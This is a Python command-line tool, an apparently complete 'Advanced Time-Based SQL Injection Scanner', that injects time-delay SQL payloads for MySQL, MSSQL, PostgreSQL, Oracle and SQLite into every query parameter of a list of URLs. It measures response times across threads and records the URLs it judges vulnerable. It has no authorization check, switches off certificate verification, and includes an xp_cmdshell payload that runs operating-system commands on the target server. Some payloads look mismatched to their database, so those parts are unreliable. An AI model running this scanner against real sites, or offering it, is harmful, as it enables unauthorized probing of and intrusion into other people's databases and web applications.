#!/usr/bin/env python3

import argparse
import requests
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import os
from statistics import mean
from colorama import Fore, Style, init
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# In-built list of standard time-based SQLi payloads for different databases
PAYLOADS = {
    "MySQL": [
        "' OR IF(1=1, SLEEP(10), 0) -- ",
        "' OR 1=1; SLEEP(10)-- ",
        "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(10) ELSE 0 END)-- ",
        "' OR BENCHMARK(10000000,MD5('test'))-- ",
        "' OR SLEEP(10) -- ",
    ],
    "MSSQL": [
        "'; IF(1=1) WAITFOR DELAY '0:0:10' -- ",
        "' OR 1=1; WAITFOR DELAY '0:0:10' -- ",
        "'; IF(1=1) WAITFOR TIME '23:59:50' -- ",
        "' OR 1=1; WAITFOR TIME '00:00:10' -- ",
        "'; EXEC master..xp_cmdshell 'ping -n 10 127.0.0.1' -- ",
    ],
    "PostgreSQL": [
        "'; SELECT pg_sleep(10)-- ",
        "' OR pg_sleep(10)-- ",
        "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) -- ",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END -- ",
        "'; PERFORM pg_sleep(10)-- ",
    ],
    "Oracle": [
        "' OR IF(1=1, DBMS_PIPE.RECEIVE_MESSAGE('',10), NULL) -- ",
        "'; BEGIN DBMS_LOCK.SLEEP(10); END; -- ",
        "' OR 1=CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(10) ELSE NULL END -- ",
        "'; EXEC DBMS_LOCK.SLEEP(10); -- ",
        "' OR (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(10) ELSE NULL END FROM dual) -- ",
    ],
    "SQLite": [
        "'; SELECT sleep(10)-- ",
        "' OR sleep(10)-- ",
        "' OR (SELECT CASE WHEN (1=1) THEN sleep(10) ELSE 0 END)-- ",
        "'; SELECT CASE WHEN (1=1) THEN sleep(10) ELSE 0 END; -- ",
        "'; SELECT printf('%s', sleep(10))-- ",
    ],
}

# Top 10 XOR-Based Time-Based SQLi Payloads with 10-Second Delay
XOR_PAYLOADS = [
    "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
    '"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z',
    "X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X",
    "X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X",
    "'XOR(SELECT(0) FROM (SELECT(SLEEP(10)))a)XOR'Z",
    "'XOR(if(now()=sysdate(),sleep(10),0))OR'",
    "1 AND (SELECT(0) FROM (SELECT(SLEEP(10)))a)-- wXyW",
    "1' AND (SELECT 6268 FROM (SELECT(SLEEP(10)))ghXo) AND 'IKlK'='IKlK",
    "1'%2b(select*from(select(sleep(10)))a)%2b'",
    "'XOR(if(now()=sysdate(),sleep(10*1),0))OR'",
]

# Combine all payloads into a single list for scanning
ALL_PAYLOADS = []
for db_payloads in PAYLOADS.values():
    ALL_PAYLOADS.extend(db_payloads)
ALL_PAYLOADS.extend(XOR_PAYLOADS)

def parse_arguments():
    parser = argparse.ArgumentParser(description='Advanced Time-Based SQL Injection Scanner')
    parser.add_argument('-i', '--input', required=True, help='Path to input file containing URLs')
    parser.add_argument('-o', '--output', required=True, help='Path to output file for vulnerable URLs')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of concurrent threads (default: 5)')
    return parser.parse_args()

def read_urls(file_path):
    if not os.path.isfile(file_path):
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Input file '{file_path}' does not exist.")
        sys.exit(1)
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {len(urls)} URLs loaded from '{file_path}'.")
        return urls
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to read input file: {e}")
        sys.exit(1)

def write_results(vulnerable_urls, output_path):
    try:
        if vulnerable_urls:
            with open(output_path, 'w') as f:
                for vuln in vulnerable_urls:
                    f.write(f"{vuln['url']} | Parameter: {vuln['parameter']} | Payload: {vuln['payload']} | Delay: {vuln['delay']}s\n")
            print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Vulnerable URLs have been written to '{output_path}'.")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to write to output file: {e}")

def get_parameters(url):
    """
    Parses the URL and returns a list of (param, value) tuples.
    """
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    params = []
    for param in query:
        values = query[param]
        for value in values:
            params.append((param, value))
    return params

def construct_payload(url, param, original_value, payload):
    """
    Constructs a new URL with the SQLi payload injected into the specified parameter.
    """
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    # Replace the parameter value with the payload
    query[param] = original_value + payload
    # Encode the query parameters
    new_query = urllib.parse.urlencode(query, doseq=True)
    # Reconstruct the full URL
    injected_url = urllib.parse.urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))
    return injected_url

def is_vulnerable(url, param, original_value, payload, delay_threshold, attempts=3):
    """
    Sends multiple requests with the payload and measures the response times.
    Returns True if the average response time exceeds the threshold, indicating potential vulnerability.
    """
    injected_url = construct_payload(url, param, original_value, payload)
    delays = []
    for attempt in range(attempts):
        try:
            headers = {
                "User-Agent": "Advanced-SQLi-Scanner/1.0",
                "Accept": "*/*",
                "Connection": "close"
            }
            start_time = time.time()
            response = requests.get(injected_url, headers=headers, timeout=delay_threshold + 10, verify=False)
            end_time = time.time()
            delay = end_time - start_time
            delays.append(delay)
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Request failed for {injected_url}: {e}")
            delays.append(0)
    average_delay = mean(delays)
    return (average_delay >= delay_threshold, injected_url, round(average_delay, 2))

def scan_parameter(url, param, value, delay_threshold):
    """
    Scans a single parameter with all payloads.
    Returns a list of vulnerabilities found.
    """
    vulnerabilities = []
    for payload in ALL_PAYLOADS:
        vuln, injected_url, avg_delay = is_vulnerable(url, param, value, payload, delay_threshold)
        if vuln:
            vulnerabilities.append({
                "url": injected_url,
                "parameter": param,
                "payload": payload.strip(),
                "delay": avg_delay
            })
            print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} {injected_url} | Param: {param} | Payload: {payload.strip()} | Delay: {avg_delay}s")
        else:
            print(f"{Fore.RED}[SAFE]{Style.RESET_ALL} {url} | Param: {param} | Payload: {payload.strip()} | Delay: {avg_delay}s")
    return vulnerabilities

def scan_url(url, delay_threshold=5):
    """
    Scans a single URL for Time-Based SQL Injection vulnerabilities.
    Returns a list of vulnerabilities found.
    """
    vulnerabilities = []
    params = get_parameters(url)
    if not params:
        print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} No parameters found in URL: {url}")
        return vulnerabilities

    for param, value in params:
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Testing parameter '{param}' in URL: {url}")
        vuln_results = scan_parameter(url, param, value, delay_threshold)
        if vuln_results:
            vulnerabilities.extend(vuln_results)
    return vulnerabilities

def main():
    args = parse_arguments()
    urls = read_urls(args.input)
    if not urls:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No URLs found in the input file.")
        sys.exit(1)

    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Starting SQLi scan with {args.threads} threads and delay threshold of 5 seconds...")
    vulnerable_urls = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {executor.submit(scan_url, url, 5): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                results = future.result()
                if results:
                    vulnerable_urls.extend(results)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Exception occurred while scanning {url}: {e}")

    if vulnerable_urls:
        write_results(vulnerable_urls, args.output)
    else:
        print(f"\n{Fore.YELLOW}[INFO]{Style.RESET_ALL} No vulnerable URLs found.")

if __name__ == "__main__":
    main()
